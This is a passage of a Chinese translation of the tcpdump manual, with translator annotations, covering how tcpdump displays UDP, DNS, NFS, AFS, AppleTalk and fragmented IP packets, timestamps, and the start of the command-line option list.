<p>注意, 单引号或反斜杆(nt: 这里用的是单引号)不能省略, 这可以防止shell对&amp;的解释或替换.</p>
<h2 id="UDP-数据包"><a href="#UDP-数据包" class="headerlink" title="UDP 数据包"></a>UDP 数据包</h2><p>UDP 数据包的显示格式，可通过rwho这个具体应用所产生的数据包来说明:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">actinide.who &gt; broadcast.who: udp 84</div></pre></td></tr></table></figure></p>
<p>其含义为:actinide主机上的端口who向broadcast主机上的端口who发送了一个udp数据包(nt: actinide和broadcast都是指Internet地址).</p>
<p>这个数据包承载的用户数据为84个字节.</p>
<p>一些UDP服务可从数据包的源或目的端口来识别，也可从所显示的更高层协议信息来识别. 比如, Domain Name service requests(DNS 请求,在RFC-1034/1035中), 和Sun RPC calls to NFS(对NFS服务器所发起的远程调用(nt: 即Sun RPC)，在RFC-1050中有对远程调用的描述).</p>
<h3 id="UDP-名称服务请求"><a href="#UDP-名称服务请求" class="headerlink" title="UDP 名称服务请求"></a>UDP 名称服务请求</h3><p>(注意:以下的描述假设你对Domain Service protoco(nt:在RFC-103中有所描述), 否则你会发现以下描述就是天书(nt:希腊文天书,不必理会, 吓吓你的, 接着看就行))</p>
<p>名称服务请求有如下的格式:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">src &gt; dst: id op? flags qtype qclass name (len)</div><div class="line">(nt: 从下文来看, 格式应该是src &gt; dst: id op flags qtype qclass? name (len))</div><div class="line">比如有一个实际显示为:</div><div class="line">h2opolo.1538 &gt; helios.domain: 3+ A? ucbvax.berkeley.edu. (37)</div></pre></td></tr></table></figure></p>
<p>主机h2opolo 向helios 上运行的名称服务器查询ucbvax.berkeley.edu 的地址记录(nt: qtype等于A). 此查询本身的id号为’3’. 符号’+’意味着递归查询标志被设置(nt: dns服务器可向更高层dns服务器查询本服务器不包含的地址记录). 这个最终通过IP包发送的查询请求数据长度为37字节, 其中不包括UDP和IP协议的头数据. 因为此查询操作为默认值(nt | rt: normal one的理解), op字段被省略.</p>
<p>如果op字段没被省略, 会被显示在’3’ 和’+’之间. 同样, qclass也是默认值, C_IN, 从而也没被显示, 如果没被忽略, 她会被显示在’A’之后.</p>
<p>异常检查会在方括中显示出附加的域:　如果一个查询同时包含一个回应(nt: 可理解为, 对之前其他一个请求的回应), 并且此回应包含权威或附加记录段,　ancount, nscout, arcount(nt: 具体字段含义需补充) 将被显示为’[na]’, ‘[nn]’, ‘[nau]’, 其中n代表合适的计数. 如果包中以下回应位(比如AA位, RA位, rcode位), 或者字节2或3中任何一个’必须为0’的位被置位(nt: 设置为1), ‘[b2&amp;3]=x’ 将被显示, 其中x表示头部字节2与字节3进行与操作后的值.</p>
<h3 id="UDP-名称服务应答"><a href="#UDP-名称服务应答" class="headerlink" title="UDP 名称服务应答"></a>UDP 名称服务应答</h3><p>对名称服务应答的数据包，tcpdump会有如下的显示格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">src &gt; dst: id op rcode flags a/n/au type class data (len)</div></pre></td></tr></table></figure></p>
<p>比如具体显示如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">helios.domain &gt; h2opolo.1538: 3 3/3/7 A 128.32.137.3 (273)</div><div class="line">helios.domain &gt; h2opolo.1537: 2 NXDomain* 0/1/0 (97)</div></pre></td></tr></table></figure></p>
<p>第一行表示: helios 对h2opolo 所发送的3号查询请求回应了3条回答记录(nt | rt: answer records), 3条名称服务器记录,以及7条附加的记录. 第一个回答记录(nt: 3个回答记录中的第一个)类型为A(nt: 表示地址), 其数据为internet地址128.32.137.3.<br>此回应UDP数据包, 包含273字节的数据(不包含UPD和IP的头部数据). op字段和rcode字段被忽略(nt: op的实际值为Query, rcode, 即response code的实际值为NoError), 同样被忽略的字段还有class 字段(nt | rt: 其值为C_IN, 这也是A类型记录默认取值)</p>
<p>第二行表示: helios 对h2opolo 所发送的2号查询请求做了回应. 回应中, rcode编码为NXDomain(nt: 表示不存在的域)), 没有回答记录,但包含一个名称服务器记录, 不包含权威服务器记录(nt | ck: 从上文来看, 此处的authority records 就是上文中对应的additionalrecords). ‘*’表示权威服务器回答标志被设置(nt: 从而additional records就表示的是authority records).由于没有回答记录, type, class, data字段都被忽略.</p>
<p>flag字段还有可能出现其他一些字符, 比如’-‘(nt: 表示可递归地查询, 即RA 标志没有被设置), ‘|’(nt: 表示被截断的消息, 即TC 标志被置位). 如果应答(nt | ct: 可理解为, 包含名称服务应答的UDP数据包, tcpdump知道这类数据包该怎样解析其数据)的’question’段一个条目(entry)都不包含(nt: 每个条目的含义, 需补充),’[nq]’ 会被打印出来.</p>
<p>要注意的是:名称服务器的请求和应答数据量比较大, 而默认的68字节的抓取长度(nt: snaplen, 可理解为tcpdump的一个设置选项)可能不足以抓取数据包的全部内容. 如果你真的需要仔细查看名称服务器的负载, 可以通过tcpdump 的-s 选项来扩大snaplen值.</p>
<h2 id="SMB-CIFS-解码"><a href="#SMB-CIFS-解码" class="headerlink" title="SMB/CIFS 解码"></a>SMB/CIFS 解码</h2><p>tcpdump 已可以对SMB/CIFS/NBT相关应用的数据包内容进行解码(nt: 分别为’Server Message Block Common’, ‘Internet File System’ ‘在TCP/IP上实现的网络协议NETBIOS的简称’. 这几个服务通常使用UDP的137/138以及TCP的139端口). 原来的对IPX和NetBEUI SMB数据包的解码能力依然可以被使用(nt: NetBEUI为NETBIOS的增强版本).</p>
<p>tcpdump默认只按照最简约模式对相应数据包进行解码, 如果我们想要详尽的解码信息可以使用其-v 启动选现. 要注意的是, -v 会产生非常详细的信息,比如对单一的一个SMB数据包, 将产生一屏幕或更多的信息, 所以此选项, 确有需要才使用.</p>
<p>关于SMB数据包格式的信息, 以及每个域的含义可以参看www.cifs.org 或者samba.org 镜像站点的pub/samba/specs/ 目录. linux 上的SMB 补丁(nt | rt: patch)由 Andrew Tridgell (tridge@samba.org)提供.</p>
<h2 id="NFS-请求和回应"><a href="#NFS-请求和回应" class="headerlink" title="NFS 请求和回应"></a>NFS 请求和回应</h2><p>tcpdump对Sun NFS(网络文件系统)请求和回应的UDP数据包有如下格式的打印输出:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">src.xid &gt; dst.nfs: len op args</div><div class="line">src.nfs &gt; dst.xid: reply stat len op results</div></pre></td></tr></table></figure></p>
<p>以下是一组具体的输出数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">sushi.6709 &gt; wrl.nfs: 112 readlink fh 21,24/10.73165</div><div class="line">wrl.nfs &gt; sushi.6709: reply ok 40 readlink &quot;../var&quot;</div><div class="line">sushi.201b &gt; wrl.nfs:</div><div class="line">144 lookup fh 9,74/4096.6878 &quot;xcolors&quot;</div><div class="line">wrl.nfs &gt; sushi.201b:</div><div class="line">reply ok 128 lookup fh 9,74/4134.3150</div></pre></td></tr></table></figure></p>
<p>第一行输出表明: 主机sushi向主机wrl发送了一个’交换请求’(nt: transaction), 此请求的id为6709(注意, 主机名字后是交换请求id号, 而不是源端口号). 此请求数据为112字节, 其中不包括UDP和IP头部的长度. 操作类型为readlink(nt: 即此操作为读符号链接操作),操作参数为fh 21,24/10.73165(nt: 可按实际运行环境, 解析如下, fd 表示描述的为文件句柄, 21,24 表示此句柄所对应设备的主/从设备号对, 10表示此句柄所对应的i节点编号(nt:每个文件都会在操作系统中对应一个i节点, 限于unix类系统中),73165是一个编号(nt: 可理解为标识此请求的一个随机数, 具体含义需补充)).</p>
<p>第二行中, wrl 做了’ok’的回应, 并且在results 字段中返回了sushi想要读的符号连接的真实目录(nt: 即sushi要求读的符号连接其实是一个目录).</p>
<p>第三行表明: sushi 再次请求 wrl 在’fh 9,74/4096.6878’所描述的目录中查找’xcolors’文件. 需要注意的是, 每行所显示的数据含义依赖于其中op字段的<br>类型(nt: 不同op 所对应args 含义不相同), 其格式遵循NFS 协议, 追求简洁明了.</p>
<p>如果tcpdump 的-v选项(详细打印选项) 被设置, 附加的信息将被显示. 比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sushi.1372a &gt; wrl.nfs:</div><div class="line">148 read fh 21,11/12.195 8192 bytes @ 24576</div><div class="line">wrl.nfs &gt; sushi.1372a:</div><div class="line">reply ok 1472 read REG 100664 ids 417/0 sz 29388</div></pre></td></tr></table></figure></p>
<p>(-v 选项一般还会打印出IP头部的TTL, ID， length, 以及fragmentation 域, 但在此例中, 都略过了(nt: 可理解为,简洁起见, 做了删减))</p>
<p>在第一行, sushi 请求wrl 从文件 21,11/12.195(nt: 格式在上面有描述)中, 自偏移24576字节处开始, 读取8192字节数据.</p>
<p>Wrl 回应读取成功; 由于第二行只是回应请求的开头片段, 所以只包含1472字节(其他的数据将在接着的reply片段中到来, 但这些数据包不会再有NFS头, 甚至UDP头信息也为空(nt: 源和目的应该要有), 这将导致这些片段不能满足过滤条件, 从而没有被打印). -v 选项除了显示文件数据信息, 还会显示附加显示文件属性信息: file type(文件类型, ‘’REG’’ 表示普通文件), file mode(文件存取模式, 8进制表示的), uid 和gid(nt: 文件属主和组属主), file size (文件大小).</p>
<p>如果-v 标志被多次重复给出(nt: 如-vv)， tcpdump会显示更加详细的信息.</p>
<p>必须要注意的是, NFS 请求包中数据比较多, 如果tcpdump 的snaplen(nt: 抓取长度) 取太短将不能显示其详细信息. 可使用’-s 192’来增加snaplen, 这可用以监测NFS应用的网络负载(nt: traffic).</p>
<p>NFS 的回应包并不严格的紧随之前相应的请求包(nt: RPC operation). 从而, tcpdump 会跟踪最近收到的一系列请求包, 再通过其交换序号(nt: transaction ID)与相应请求包相匹配. 这可能产生一个问题， 如果回应包来得太迟, 超出tcpdump 对相应请求包的跟踪范围,该回应包将不能被分析.</p>
<h2 id="AFS-请求和回应"><a href="#AFS-请求和回应" class="headerlink" title="AFS 请求和回应"></a>AFS 请求和回应</h2><p>AFS(nt: Andrew 文件系统, Transarc , 未知, 需补充)请求和回应有如下的答应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">src.sport &gt; dst.dport: rx packet-type</div><div class="line">src.sport &gt; dst.dport: rx packet-type service call call-name args</div><div class="line">src.sport &gt; dst.dport: rx packet-type service reply call-name args</div><div class="line"></div><div class="line">elvis.7001 &gt; pike.afsfs:</div><div class="line">rx data fs call rename old fid 536876964/1/1 &quot;.newsrc.new&quot;</div><div class="line">new fid 536876964/1/1 &quot;.newsrc&quot;</div><div class="line">pike.afsfs &gt; elvis.7001: rx data fs reply rename</div></pre></td></tr></table></figure></p>
<p>在第一行, 主机elvis 向pike 发送了一个RX数据包.</p>
<p>这是一个对于文件服务的请求数据包(nt: RX data packet, 发送数据包 , 可理解为发送包过去, 从而请求对方的服务), 这也是一个RPC调用的开始(nt: RPC, remote procedure call). 此RPC 请求pike 执行rename(nt: 重命名) 操作, 并指定了相关的参数:原目录描述符为536876964/1/1, 原文件名为 ‘.newsrc.new’, 新目录描述符为536876964/1/1, 新文件名为 ‘.newsrc’.</p>
<p>主机pike 对此rename操作的RPC请求作了回应(回应表示rename操作成功, 因为回应的是包含数据内容的包而不是异常包).</p>
<p>一般来说, 所有的’AFS RPC’请求被显示时, 会被冠以一个名字(nt: 即decode, 解码), 这个名字往往就是RPC请求的操作名.</p>
<p>并且, 这些RPC请求的部分参数在显示时, 也会被冠以一个名字(nt | rt: 即decode, 解码, 一般来说也是取名也很直接, 比如,一个interesting 参数, 显示的时候就会直接是’interesting’, 含义拗口, 需再翻).</p>
<p>这种显示格式的设计初衷为’一看就懂’, 但对于不熟悉AFS 和 RX 工作原理的人可能不是很有用(nt: 还是不用管, 书面吓吓你的, 往下看就行).</p>
<p>如果 -v(详细)标志被重复给出(nt: 如-vv), tcpdump 会打印出确认包(nt: 可理解为, 与应答包有区别的包)以及附加头部信息(nt: 可理解为, 所有包, 而不仅仅是确认包的附加头部信息), 比如, RX call ID(请求包中’请求调用’的ID),call number(‘请求调用’的编号), sequence number(nt: 包顺序号),serial number(nt | rt: 可理解为与包中数据相关的另一个顺信号, 具体含义需补充), 请求包的标识. (nt: 接下来一段为重复描述,<br>所以略去了), 此外确认包中的MTU协商信息也会被打印出来(nt: 确认包为相对于请求包的确认包, Maximum Transmission Unit, 最大传输单元).</p>
<p>如果 -v 选项被重复了三次(nt: 如-vvv), 那么AFS应用类型数据包的’安全索引’(‘security index’)以及’服务索引’(‘service id’)将会被打印.</p>
<p>对于表示异常的数据包(nt: abort packet, 可理解为, 此包就是用来通知接受者某种异常已发生), tcpdump 会打印出错误号(error codes).</p>
<p>但对于Ubik beacon packets(nt: Ubik 灯塔指示包, Ubik可理解为特殊的通信协议, beacon packets, 灯塔数据包, 可理解为指明通信中关键信息的一些数据包), 错误号不会被打印, 因为对于Ubik 协议, 异常数据包不是表示错误, 相反却是表示一种肯定应答(nt: 即, yes vote).</p>
<p>AFS 请求数据量大, 参数也多, 所以要求tcpdump的 snaplen 比较大, 一般可通过启动tcpdump时设置选项’-s 256’ 来增大snaplen, 以监测AFS 应用通信负载.</p>
<p>AFS 回应包并不显示标识RPC 属于何种远程调用. 从而, tcpdump 会跟踪最近一段时间内的请求包, 并通过call number(调用编号), service ID(服务索引) 来匹配收到的回应包. 如果回应包不是针对最近一段时间内的请求包, tcpdump将无法解析该包.</p>
<h2 id="KIP-AppleTalk协议"><a href="#KIP-AppleTalk协议" class="headerlink" title="KIP AppleTalk协议"></a>KIP AppleTalk协议</h2><p>(nt | rt: DDP in UDP可理解为, DDP, The AppleTalk Data Delivery Protocol,<br>相当于支持KIP AppleTalk协议栈的网络层协议, 而DDP 本身又是通过UDP来传输的,<br>即在UDP 上实现的用于其他网络的网络层，KIP AppleTalk是苹果公司开发的整套网络协议栈).</p>
<p>AppleTalk DDP 数据包被封装在UDP数据包中, 其解封装(nt: 相当于解码)和相应信息的转储也遵循DDP 包规则.(nt:encapsulate, 封装, 相当于编码, de-encapsulate, 解封装, 相当于解码, dump, 转储, 通常就是指对其信息进行打印).</p>
<p>/etc/atalk.names 文件中包含了AppleTalk 网络和节点的数字标识到名称的对应关系. 其文件格式通常如下所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">number name</div><div class="line"></div><div class="line">1.254 ether</div><div class="line">16.1 icsd-net</div><div class="line">1.254.110 ace</div></pre></td></tr></table></figure></p>
<p>头两行表示有两个AppleTalk 网络. 第三行给出了特定网络上的主机(一个主机会用3个字节来标识,而一个网络的标识通常只有两个字节, 这也是两者标识的主要区别)(nt: 1.254.110 可理解为ether网络上的ace主机).</p>
<p>标识与其对应的名字之间必须要用空白分开. 除了以上内容, /etc/atalk.names中还包含空行以及注释行(以’#’开始的行).</p>
<p>AppleTalk 完整网络地址将以如下格式显示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net.host.port</div></pre></td></tr></table></figure></p>
<p>以下为一段具体显示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">144.1.209.2 &gt; icsd-net.112.220</div><div class="line">office.2 &gt; icsd-net.112.220</div><div class="line">jssmag.149.235 &gt; icsd-net.2</div></pre></td></tr></table></figure></p>
<p>(如果/etc/atalk.names 文件不存在, 或者没有相应AppleTalk 主机/网络的条目, 数据包的网络地址将以数字形式显示).</p>
<p>在第一行中, 网络144.1上的节点209通过2端口,向网络icsd-net上监听在220端口的112节点发送了一个NBP应用数据包(nt | rt: NBP, name binding protocol, 名称绑定协议, 从数据来看, NBP服务器会在端口2提供此服务.’DDP port 2’ 可理解为’DDP 对应传输层的端口2’, DDP本身没有端口的概念, 这点未确定, 需补充).</p>
<p>第二行与第一行类似, 只是源的全部地址可用’office’进行标识.</p>
<p>第三行表示: jssmag网络上的149节点通过235向icsd-net网络上的所有节点的2端口(NBP端口)发送了数据包.(需要注意的是,在AppleTalk 网络中如果地址中没有节点, 则表示广播地址, 从而节点标识和网络标识最好在/etc/atalk.names有所区别.nt: 否则一个标识x.port 无法确定x是指一个网络上所有主机的port口还是指定主机x的port口).</p>
<p>tcpdump 可解析NBP (名称绑定协议) and ATP (AppleTalk传输协议)数据包, 对于其他应用层的协议, 只会打印出相应协议名字(如果此协议没有注册一个通用名字, 只会打印其协议号)以及数据包的大小.</p>
<p>NBP 数据包会按照如下格式显示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">icsd-net.112.220 &gt; jssmag.2: nbp-lkup 190: &quot;=:LaserWriter@*&quot;</div><div class="line">jssmag.209.2 &gt; icsd-net.112.220: nbp-reply 190: &quot;RM1140:LaserWriter@*&quot; 250</div><div class="line">techpit.2 &gt; icsd-net.112.220: nbp-reply 190: &quot;techpit:LaserWriter@*&quot; 186</div></pre></td></tr></table></figure></p>
<p>第一行表示: 网络icsd-net 中的节点112 通过220端口向网络jssmag 中所有节点的端口2发送了对’LaserWriter’的名称查询请求(nt:此处名称可理解为一个资源的名称, 比如打印机). 此查询请求的序列号为190.</p>
<p>第二行表示: 网络jssmag 中的节点209 通过2端口向icsd-net.112节点的端口220进行了回应: 我有’LaserWriter’资源, 其资源名称为’RM1140’, 并且在端口250上提供改资源的服务. 此回应的序列号为190, 对应之前查询的序列号.</p>
<p>第三行也是对第一行请求的回应: 节点techpit 通过2端口向icsd-net.112节点的端口220进行了回应:我有’LaserWriter’资源, 其资源名称为’techpit’, 并且在端口186上提供改资源的服务. 此回应的序列号为190, 对应之前查询的序列号.</p>
<p>ATP 数据包的显示格式如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">jssmag.209.165 &gt; helios.132: atp-req 12266&lt;0-7&gt; 0xae030001</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:0 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:1 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:2 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:3 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:5 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:6 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp*12266:7 (512) 0xae040000</div><div class="line">jssmag.209.165 &gt; helios.132: atp-req 12266&lt;3,5&gt; 0xae030001</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:3 (512) 0xae040000</div><div class="line">helios.132 &gt; jssmag.209.165: atp-resp 12266:5 (512) 0xae040000</div><div class="line">jssmag.209.165 &gt; helios.132: atp-rel 12266&lt;0-7&gt; 0xae030001</div><div class="line">jssmag.209.133 &gt; helios.132: atp-req* 12267&lt;0-7&gt; 0xae030002</div></pre></td></tr></table></figure></p>
<p>第一行表示节点 Jssmag.209 向节点helios 发送了一个会话编号为12266的请求包, 请求helios回应8个数据包(这8个数据包的顺序号为0-7(nt: 顺序号与会话编号不同, 后者为一次完整传输的编号,前者为该传输中每个数据包的编号. transaction, 会话, 通常也被叫做传输)). 行尾的16进制数字表示该请求包中’userdata’域的值(nt: 从下文来看, 这并没有把所有用户数据都打印出来 ).</p>
<p>Helios 回应了8个512字节的数据包. 跟在会话编号(nt: 12266)后的数字表示该数据包在该会话中的顺序号.括号中的数字表示该数据包中数据的大小, 这不包括atp 的头部. 在顺序号为7数据包(第8行)外带了一个’*’号,表示该数据包的EOM 标志被设置了.(nt: EOM, End Of Media, 可理解为, 表示一次会话的数据回应完毕).</p>
<p>接下来的第9行表示, Jssmag.209 又向helios 提出了请求: 顺序号为3以及5的数据包请重新传送. Helios 收到这个请求后重新发送了这个两个数据包, jssmag.209 再次收到这两个数据包之后, 主动结束(release)了此会话.</p>
<p>在最后一行, jssmag.209 向helios 发送了开始下一次会话的请求包. 请求包中的’*’表示该包的XO 标志没有被设置.</p>
<p>(nt: XO, exactly once, 可理解为在该会话中, 数据包在接受方只被精确地处理一次, 就算对方重复传送了该数据包,接收方也只会处理一次, 这需要用到特别设计的数据包接收和处理机制).</p>
<h1 id="IP-数据包破碎"><a href="#IP-数据包破碎" class="headerlink" title="IP 数据包破碎"></a>IP 数据包破碎</h1><p>(nt: 指把一个IP数据包分成多个IP数据包)</p>
<p>碎片IP数据包(nt: 即一个大的IP数据包破碎后生成的小IP数据包)有如下两种显示格式.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(frag id:size@offset+)</div><div class="line">(frag id:size@offset)</div></pre></td></tr></table></figure></p>
<p>(第一种格式表示, 此碎片之后还有后续碎片. 第二种格式表示, 此碎片为最后一个碎片.)</p>
<p>id 表示破碎编号(nt: 从下文来看, 会为每个要破碎的大IP包分配一个破碎编号, 以便区分每个小碎片是否由同一数据包破碎而来).</p>
<p>size 表示此碎片的大小 , 不包含碎片头部数据. offset表示此碎片所含数据在原始整个IP包中的偏移((nt: 从下文来看,一个IP数据包是作为一个整体被破碎的, 包括头和数据, 而不只是数据被分割).</p>
<p>每个碎片都会使tcpdump产生相应的输出打印. 第一个碎片包含了高层协议的头数据(nt:从下文来看, 被破碎IP数据包中相应tcp头以及IP头都放在了第一个碎片中 ), 从而tcpdump会针对第一个碎片显示这些信息, 并接着显示此碎片本身的信息. 其后的一些碎片并不包含高层协议头信息, 从而只会在显示源和目的之后显示碎片本身的信息. 以下有一个例子: 这是一个从arizona.edu 到lbl-rtsg.arpa途经CSNET网络(nt: CSNET connection 可理解为建立在CSNET 网络上的连接)的ftp应用通信片段:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">arizona.ftp-data &gt; rtsg.1170: . 1024:1332(308) ack 1 win 4096 (frag 595a:328@0+)</div><div class="line">arizona &gt; rtsg: (frag 595a:204@328)</div><div class="line">rtsg.1170 &gt; arizona.ftp-data: . ack 1536 win 2560</div></pre></td></tr></table></figure></p>
<p>有几点值得注意:</p>
<p>第一, 第二行的打印中, 地址后面没有端口号.</p>
<p>这是因为TCP协议信息都放到了第一个碎片中, 当显示第二个碎片时, 我们无法知道此碎片所对应TCP包的顺序号.</p>
<p>第二, 从第一行的信息中, 可以发现arizona需要向rtsg发送308字节的用户数据, 而事实是, 相应IP包经破碎后会总共产生512字节数据(第一个碎片包含308字节的数据, 第二个碎片包含204个字节的数据, 这超过了308字节). 如果你在查找数据包的顺序号空间中的<br>一些空洞(nt: hole,空洞, 指数据包之间的顺序号没有上下衔接上), 512这个数据就足够使你迷茫一阵(nt: 其实只要关注308就行,不必关注破碎后的数据总量).</p>
<p>一个数据包(nt | rt: 指IP数据包)如果带有非IP破碎标志, 则显示时会在最后显示’(DF)’.(nt: 意味着此IP包没有被破碎过).</p>
<h1 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h1><p>tcpdump的所有输出打印行中都会默认包含时间戳信息.</p>
<p>时间戳信息的显示格式如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">hh:mm:ss.frac　(nt: 小时:分钟:秒.(nt: frac未知, 需补充))</div></pre></td></tr></table></figure></p>
<p>此时间戳的精度与内核时间精度一致,　反映的是内核第一次看到对应数据包的时间(nt: saw, 即可对该数据包进行操作).　而数据包从物理线路传递到内核的时间, 以及内核花费在此包上的中断处理时间都没有算进来.</p>
<h1 id="命令使用"><a href="#命令使用" class="headerlink" title="命令使用"></a>命令使用</h1><p>tcpdump采用命令行方式，它的命令格式为：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">tcpdump [ -AdDeflLnNOpqRStuUvxX ] [ -c count ]</div><div class="line">           [ -C file_size ] [ -F file ]</div><div class="line">           [ -i interface ] [ -m module ] [ -M secret ]</div><div class="line">           [ -r file ] [ <span class="_">-s</span> snaplen ] [ -T <span class="built_in">type</span> ] [ -w file ]</div><div class="line">           [ -W filecount ]</div><div class="line">           [ -E spi@ipaddr algo:secret,...  ]</div><div class="line">           [ -y datalinktype ] [ -Z user ]</div><div class="line">           [ expression ]</div></pre></td></tr></table></figure></p>
<h2 id="tcpdump的简单选项介绍"><a href="#tcpdump的简单选项介绍" class="headerlink" title="tcpdump的简单选项介绍"></a>tcpdump的简单选项介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div></pre></td><td class="code"><pre><div class="line">-A  以ASCII码方式显示每一个数据包(不会显示数据包中链路层头部信息). 在抓取包含网页数据的数据包时, 可方便查看数据(nt: 即Handy for capturing web pages).</div><div class="line"></div><div class="line">-c  count</div><div class="line">    tcpdump将在接受到count个数据包后退出.</div><div class="line"></div><div class="line">-C  file-size (nt: 此选项用于配合-w file 选项使用)</div><div class="line">    该选项使得tcpdump 在把原始数据包直接保存到文件中之前, 检查此文件大小是否超过file-size. 如果超过了, 将关闭此文件,另创一个文件继续用于原始数据包的记录. 新创建的文件名与-w 选项指定的文件名一致, 但文件名后多了一个数字.该数字会从1开始随着新创建文件的增多而增加. file-size的单位是百万字节(nt: 这里指1,000,000个字节,并非1,048,576个字节, 后者是以1024字节为1k, 1024k字节为1M计算所得, 即1M=1024 ＊ 1024 ＝ 1,048,576)</div><div class="line"></div><div class="line">-d  以容易阅读的形式,在标准输出上打印出编排过的包匹配码, 随后tcpdump停止.(nt | rt: human readable, 容易阅读的,通常是指以ascii码来打印一些信息. compiled, 编排过的. packet-matching code, 包匹配码,含义未知, 需补充)</div><div class="line"></div><div class="line">-dd 以C语言的形式打印出包匹配码.</div><div class="line"></div><div class="line">-ddd 以十进制数的形式打印出包匹配码(会在包匹配码之前有一个附加的&apos;count&apos;前缀).</div><div class="line"></div><div class="line">-D  打印系统中所有tcpdump可以在其上进行抓包的网络接口. 每一个接口会打印出数字编号, 相应的接口名字, 以及可能的一个网络接口描述. 其中网络接口名字和数字编号可以用在tcpdump 的-i flag 选项(nt: 把名字或数字代替flag), 